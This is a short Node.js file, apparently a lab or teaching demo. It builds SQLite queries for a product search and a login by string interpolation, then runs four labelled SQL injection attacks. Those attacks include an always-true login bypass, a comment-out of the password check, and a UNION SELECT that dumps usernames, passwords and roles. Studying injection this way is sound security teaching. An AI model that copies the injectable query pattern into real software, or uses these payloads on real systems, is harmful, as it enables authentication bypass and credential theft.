const Database = require('better-sqlite3');

const db = new Database('nyondo_stock.db');

function searchProduct(name) {

    const query =
        `SELECT * FROM products WHERE name LIKE '%${name}%'`;

    console.log('\nQuery:', query);

    const rows = db.prepare(query).all();

    console.log('Result:', rows, '\n');

    return rows;
}

function login(username, password) {

    const query =
        `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;

    console.log('\nQuery:', query);

    const row = db.prepare(query).get();

    console.log('Result:', row, '\n');

    return row;
}


// ATTACK 1
searchProduct("' OR 1=1--");

// ATTACK 2
login("admin'--", "anything");

// ATTACK 3
login("' OR '1'='1", "' OR '1'='1");

// ATTACK 4
searchProduct("' UNION SELECT id, username, password, role FROM users--");